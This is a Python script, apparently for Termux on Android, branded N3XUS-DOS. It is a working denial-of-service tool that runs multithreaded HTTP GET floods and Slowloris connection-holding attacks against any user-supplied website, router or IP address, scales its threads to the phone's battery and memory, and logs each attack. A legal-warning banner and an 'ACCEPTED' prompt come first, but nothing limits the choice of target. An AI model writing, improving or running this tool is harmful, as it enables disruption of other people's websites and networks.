import os, time, socket, random, threading, subprocess

WARN = """████████████████████████████████████████████████████████
█  ⚠️  STOP! THIS IS ILLEGAL!                           █
█  ⚠️  USING AGAINST OTHERS = CRIMINAL OFFENSE.         █
█                                                      █
█  Moldova:        art. 259                            █
█  Ukraine:        art. 361                            █
█  Russia:         art. 272                            █
█  United States:  CFAA 18 U.S.C. § 1030               █
█  United Kingdom: Computer Misuse Act 1990            █
█                                                      █
█  USE ONLY ON YOUR OWN TARGETS.                       █
████████████████████████████████████████████████████████
"""


def check_battery():
    try:
        r = subprocess.run(["termux-battery-status"], capture_output=True, text=True, timeout=5)
        p = r.stdout.find('"percentage":')
        return int(r.stdout[p+13:].split(",")[0]) if p != -1 else 100
    except Exception:
        return 100


def check_mem():
    try:
        r = subprocess.run(["free", "-m"], capture_output=True, text=True, timeout=5)
        for line in r.stdout.split("\n"):
            if "Mem:" in line:
                p = line.split()
                return int(p[6]) if len(p) > 6 else 500
        return 500
    except Exception:
        return 500


def check_wifi():
    try:
        r = subprocess.run(["termux-wifi-connectioninfo"], capture_output=True, text=True, timeout=5)
        return '"ip": "' in r.stdout
    except Exception:
        return True


def get_mode():
    bat = check_battery()
    mem = check_mem()
    if not check_wifi():
        return "BLOCKED", 0, 0, "No Wi-Fi"
    if bat < 10:
        return "BLOCKED", 0, 0, "Battery < 10%"
    if bat < 30 or mem < 300:
        return "LOW POWER", 125, 15, f"Battery {bat}%, memory {mem} MB"
    if bat < 60 or mem < 700:
        return "SAFE MODE", 250, 30, f"Battery {bat}%, memory {mem} MB"
    return "FULL POWER", 500, 30, f"Battery {bat}%, memory {mem} MB"


def http_flood(target, seconds, stats, lock):
    end = time.time() + seconds
    req = "GET /?{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: N3XUS-DOS\r\nConnection: close\r\n\r\n"
    while time.time() < end and not stats["stop"]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, 80))
            s.sendall(req.format(random.randint(1, 99999), target).encode())
            s.recv(1024)
            s.close()
            with lock:
                stats["ok"] += 1
        except Exception:
            with lock:
                stats["err"] += 1


def slowloris(target, seconds, stats, lock):
    end = time.time() + seconds
    socks = []
    for _ in range(50):
        if stats["stop"]:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, 80))
            s.sendall(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            socks.append(s)
        except Exception:
            pass
    while time.time() < end and not stats["stop"]:
        for s in socks:
            try:
                s.sendall(f"X-a: {random.randint(1, 9999)}\r\n".encode())
                with lock:
                    stats["ok"] += 1
            except Exception:
                with lock:
                    stats["err"] += 1
                try:
                    s.close()
                except Exception:
                    pass
        time.sleep(1)
    for s in socks:
        try:
            s.close()
        except Exception:
            pass


def show_stats(stats, seconds, lock):
    for i in range(seconds):
        if stats["stop"]:
            return
        time.sleep(1)
        with lock:
            ok = stats["ok"]
            err = stats["err"]
        os.system("clear")
        print(f"  [+] Requests: {ok}")
        print(f"  [+] Errors:   {err}")
        print(f"  [+] RPS:      {ok // (i + 1)}")
        print(f"  [+] Time:     {i + 1}/{seconds} sec")
        print("  [Ctrl+C] — stop")


def main():
    os.system("clear")
    print(WARN)
    print()
    if input("Type ACCEPTED to continue: ").strip() != "ACCEPTED":
        print("[!] Cancelled.")
        return

    os.system("clear")
    print("[*] Checking phone state...\n")
    mode, threads, seconds, info = get_mode()
    print(f"  State:   {info}")
    print(f"  Mode:    {mode}")
    print(f"  Threads: {threads}")
    print(f"  Seconds: {seconds}\n")

    if mode == "BLOCKED":
        print("[!] Phone not ready.")
        return

    print("Choose target category:\n")
    print("  [1] Website / Domain   (e.g. scanme.nmap.org, example.com)")
    print("  [2] Wi-Fi Router       (e.g. 192.168.1.1, 192.168.0.1)")
    print("  [3] Direct IP Address  (e.g. 127.0.0.1, custom IP)")
    print("  [0] Exit\n")

    choice = input("> ").strip()
    if choice == "0" or not choice:
        print("[!] Cancelled.")
        return

    if choice == "1":
        category_name = "Website / Domain"
        link = input("\nEnter website URL or domain: ").strip()
    elif choice == "2":
        category_name = "Wi-Fi Router"
        link = input("\nEnter router IP address: ").strip()
    elif choice == "3":
        category_name = "Direct IP Address"
        link = input("\nEnter target IP address: ").strip()
    else:
        print("[!] Invalid choice.")
        return

    if not link:
        print("[!] Empty input. Cancelled.")
        return

    # Сохраняем оригинальный ввод для красивого вывода
    display_target = link

    # Технический хост для сокетов под капотом
    target = link.replace("https://", "").replace("http://", "").split("/")[0]
    target = target.split(":")[0]

    print(f"\n[+] Category: {category_name}")
    print(f"[+] Target:   {display_target}")
    print(f"[+] {mode} | {threads} threads | {seconds} sec")
    if input("Continue? (y/n): ").strip().lower() != "y":
        print("[!] Cancelled.")
        return

    stats = {"ok": 0, "err": 0, "stop": False}
    lock = threading.Lock()

    for _ in range(threads // 2):
        threading.Thread(target=http_flood, args=(target, seconds, stats, lock), daemon=True).start()
    for _ in range(threads // 2):
        threading.Thread(target=slowloris, args=(target, seconds, stats, lock), daemon=True).start()

    try:
        show_stats(stats, seconds, lock)
    except KeyboardInterrupt:
        stats["stop"] = True
        print("\n[!] Stopped.")

    with lock:
        ok = stats["ok"]
        err = stats["err"]

    print(f"\n[+] Done.")
    print(f"[+] Requests: {ok}")
    print(f"[+] Errors:   {err}")
    print(f"[+] Target:   {display_target}")

    try:
        with open(os.path.expanduser("~/n3xus-dos.log"), "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {display_target} | {mode} | {ok} ok, {err} err\n")
    except Exception:
        pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped.")

